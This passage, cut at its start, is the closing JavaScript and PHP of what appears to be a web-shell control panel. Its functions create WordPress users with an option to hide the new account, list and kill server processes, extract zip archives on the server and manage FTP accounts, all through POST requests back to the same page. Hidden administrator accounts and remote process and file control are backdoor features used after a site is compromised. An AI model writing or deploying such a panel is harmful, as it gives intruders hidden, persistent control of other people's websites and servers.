            document.getElementById('wpNewPass').value = '';
            document.getElementById('wpNewEmail').value = '';
            document.getElementById('wpHideUser').checked = false;
            wpLoadUsers();
        } else {
            wpShowStatus('❌ Error: ' + (r.err || 'unknown'), 'err');
        }
    });
}

function wpShowStatus(msg, type) {
    var el = document.getElementById('wpCreateStatus');
    el.style.display = 'block';
    el.textContent = msg;
    el.style.background = type === 'ok' ? 'rgba(63,185,80,0.08)' : 'rgba(248,81,73,0.08)';
    el.style.border = '1px solid ' + (type === 'ok' ? 'var(--accent-green)' : 'var(--accent-red)');
    el.style.color = type === 'ok' ? 'var(--accent-green)' : 'var(--accent-red)';
    if (type === 'ok' && msg !== '⏳ Creating...') {
        setTimeout(function(){ el.style.display = 'none'; }, 8000);
    }
}

var procData = null;
var procTimer = null;
var procPaused = false;
var procKillTarget = null;
var procCurrentUser = '<?php echo get_current_user(); ?>';

function procRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { callback(JSON.parse(xhr.responseText)); }
        catch(e) { callback({err: 'Parse error'}); }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = [];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function procStart() {
    procPaused = false;
    var btn = document.getElementById('procPauseBtn');
    if (btn) btn.textContent = '⏸ Pause';
    procLoad();
    if (procTimer) clearInterval(procTimer);
    procTimer = setInterval(function() {
        if (!procPaused) procLoad();
    }, 3000);
}

function procStopAndClose() {
    if (procTimer) { clearInterval(procTimer); procTimer = null; }
    document.getElementById('procModal').classList.add('hidden');
}

function procTogglePause() {
    procPaused = !procPaused;
    var btn = document.getElementById('procPauseBtn');
    btn.textContent = procPaused ? '▶ Resume' : '⏸ Pause';
    var indicator = document.getElementById('procLiveIndicator');
    indicator.style.background = procPaused ? 'var(--accent-orange)' : 'var(--accent-green)';
    indicator.style.animation = procPaused ? 'none' : 'procPulse 1s infinite';
}

function procLoad() {
    procRequest({proc_action: 'list'}, function(r) {
        if (r.err) {
            document.getElementById('procTableBody').innerHTML = '<tr><td colspan="8" style="text-align:center;padding:30px;color:var(--accent-red);">❌ ' + r.err + '</td></tr>';
            return;
        }
        procData = r;
        document.getElementById('procStats').textContent = r.total + ' processes | ' + r.total_hidden + ' hidden | ' + r.total_recent + ' recent';
        var alerts = document.getElementById('procAlerts');
        var alertHtml = '';
        if (r.total_hidden > 0) {
            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(248,81,73,0.1);border:1px solid var(--accent-red);color:var(--accent-red);padding:3px 12px;border-radius:6px;font-size:10px;font-weight:600;">⚠️ ' + r.total_hidden + ' HIDDEN PROCESSES</span>';
        }
        if (r.total_recent > 0) {
            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(63,185,80,0.08);border:1px solid var(--accent-green);color:var(--accent-green);padding:3px 12px;border-radius:6px;font-size:10px;font-weight:600;">🕐 ' + r.total_recent + ' recent (&lt;5min)</span>';
        }
        alerts.innerHTML = alertHtml;
        procFilterRender();
    });
}

function procFilterRender() {
    if (!procData) return;
    var search = (document.getElementById('procSearch').value || '').toLowerCase();
    var filter = document.getElementById('procFilter').value;
    var sort = document.getElementById('procSort').value;

    var list = [];

    if (filter === 'all' || filter === 'hidden') {
        (procData.hidden || []).forEach(function(h) {
            list.push({
                pid: h.pid, user: h.user, cpu: '?', mem: '?', vsz: '?', rss: '?',
                tty: '?', stat: '?', start: '?', time: '?', command: h.command,
                _type: 'hidden'
            });
        });
    }

    var recentPids = {};
    (procData.recent || []).forEach(function(r) { recentPids[r.pid] = r.age_seconds; });

    var procs = procData.processes || [];
    procs.forEach(function(p) {
        var type = 'normal';
        if (recentPids[p.pid] !== undefined) type = 'recent';
        if (filter === 'hidden') return;
        if (filter === 'mine' && p.user !== procCurrentUser) return;
        if (filter === 'recent' && type !== 'recent') return;
        p._type = type;
        if (type === 'recent') p._age = recentPids[p.pid];
        list.push(p);
    });

    if (search) {
        list = list.filter(function(p) {
            return (p.pid + ' ' + p.user + ' ' + p.command + ' ' + p.stat).toLowerCase().indexOf(search) >= 0;
        });
    }

    list.sort(function(a, b) {
        if (a._type === 'hidden' && b._type !== 'hidden') return -1;
        if (b._type === 'hidden' && a._type !== 'hidden') return 1;
        if (sort === 'cpu') return parseFloat(b.cpu || 0) - parseFloat(a.cpu || 0);
        if (sort === 'mem') return parseFloat(b.mem || 0) - parseFloat(a.mem || 0);
        if (sort === 'pid') return parseInt(b.pid || 0) - parseInt(a.pid || 0);
        if (sort === 'start') return 0;
        return 0;
    });

    var html = '';
    if (list.length === 0) {
        html = '<tr><td colspan="8" style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">No matching processes.</td></tr>';
    }
    list.forEach(function(p) {
        var rowClass = 'proc-row';
        var badge = '';
        if (p._type === 'hidden') {
            rowClass += ' proc-hidden';
            badge = '<span style="background:var(--accent-red);color:#fff;padding:1px 6px;border-radius:4px;font-size:8px;font-weight:700;margin-left:4px;">🙈 HIDDEN</span>';
        } else if (p._type === 'recent') {
            rowClass += ' proc-recent';
            var ageStr = p._age !== undefined ? p._age + 's ago' : 'new';
            badge = '<span style="background:var(--accent-green);color:#000;padding:1px 6px;border-radius:4px;font-size:8px;font-weight:700;margin-left:4px;">🕐 ' + ageStr + '</span>';
        }

        var cpuClass = parseFloat(p.cpu) > 50 ? ' proc-high-cpu' : '';
        var memClass = parseFloat(p.mem) > 50 ? ' proc-high-mem' : '';

        var cmdShort = (p.command || '').length > 80 ? p.command.substring(0, 80) + '…' : (p.command || '');
        var cmdEsc = cmdShort.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var cmdFullEsc = (p.command || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');

        html += '<tr class="' + rowClass + '" style="border-bottom:1px solid var(--border-color);">';
        html += '<td style="padding:5px 10px;color:var(--accent-pink);font-family:monospace;font-weight:600;white-space:nowrap;">' + p.pid + '</td>';
        html += '<td style="padding:5px 10px;color:var(--text-muted);white-space:nowrap;">' + (p.user || '?') + '</td>';
        html += '<td style="padding:5px 10px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + cpuClass + '">' + (p.cpu || '?') + '</td>';
        html += '<td style="padding:5px 10px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + memClass + '">' + (p.mem || '?') + '</td>';
        html += '<td style="padding:5px 10px;color:var(--text-muted);font-family:monospace;white-space:nowrap;">' + (p.stat || '?') + '</td>';
        html += '<td style="padding:5px 10px;color:var(--text-muted);white-space:nowrap;">' + (p.start || '?') + '</td>';
        html += '<td style="padding:5px 10px;color:var(--text-primary);font-family:monospace;font-size:10px;" title="' + cmdFullEsc + '">' + cmdEsc + badge + '</td>';
        html += '<td style="padding:5px 10px;text-align:center;white-space:nowrap;">';
        if (p.pid && p.pid !== '?') {
            html += '<button class="btn btn-sm btn-danger" style="padding:2px 8px;font-size:9px;" onclick="procKill(' + p.pid + ',\'' + cmdShort.replace(/'/g, "\\'").replace(/"/g, '&quot;') + '\')">⚡ Kill</button>';
        }
        html += '</td>';
        html += '</tr>';
    });

    document.getElementById('procTableBody').innerHTML = html;
}

function procKill(pid, cmd) {
    procKillTarget = pid;
    document.getElementById('procKillPid').textContent = '#' + pid;
    document.getElementById('procKillCmd').textContent = cmd;
    document.getElementById('procKillModal').classList.remove('hidden');
}

function procDoKill(sig) {
    if (!procKillTarget) return;
    procRequest({proc_action: 'kill', pid: procKillTarget, signal: sig}, function(r) {
        document.getElementById('procKillModal').classList.add('hidden');
        procKillTarget = null;
        if (!procPaused) procLoad();
    });
}

function extractFile(filePath, targetDir) {
    var decodedPath = decodeURIComponent(filePath);
    var decodedDir = decodeURIComponent(targetDir);
    
    var form = document.createElement('form');
    form.method = 'POST';
    form.style.display = 'none';
    var inp1 = document.createElement('input');
    inp1.type = 'hidden';
    inp1.name = 'extract_zip';
    inp1.value = decodedPath;
    form.appendChild(inp1);
    var inp2 = document.createElement('input');
    inp2.type = 'hidden';
    inp2.name = 'extract_target';
    inp2.value = decodedDir;
    form.appendChild(inp2);
    document.body.appendChild(form);
    form.submit();
}

document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) overlay.classList.add('hidden');
    });
});

<?php if (!empty($ftpAccounts) || isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])): ?>
showModal('ftp');
<?php endif; ?>
</script>

<?php endif; ?>
</body>
</html>
